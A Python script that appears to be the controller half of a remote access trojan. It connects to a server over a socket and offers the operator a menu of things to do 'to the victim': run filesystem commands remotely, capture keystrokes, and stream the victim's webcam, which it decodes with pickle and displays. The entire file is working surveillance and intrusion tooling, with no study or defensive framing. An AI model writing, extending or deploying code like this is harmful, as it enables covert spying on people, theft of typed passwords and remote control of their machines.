#!/usr/bin/env python3
import socket
import cv2
import numpy as np
import socket
import sys
import pickle
import struct

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    choice = input("What would you like to do to the victim: 1) check Filesystem"
          "2) Capture keystrokes 3) Check Webcam  4) Close Connection")
    s.send(choice.encode())
    if(int(choice) == 1):
        while True:
            cmd = input(">> ")
            if str(cmd) == 'END':
                break
            s.send(cmd.encode())
            output = s.recv(1024)
            print('Received', repr(output))
    if(int(choice) == 2):
        while True:
            output = s.recv(1024)
            print(output.decode())

    if(int(choice) == 3):
        data = b''
        payload_size = struct.calcsize("L")
        while True:
            # Retrieve message size
            while len(data) < payload_size:
                data += s.recv(4096)

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]  ### CHANGED

            # Retrieve all data based on message size
            while len(data) < msg_size:
                data += s.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            # Extract frame
            frame = pickle.loads(frame_data)

            # Display
            cv2.imshow('frame', frame)
            cv2.waitKey(1)
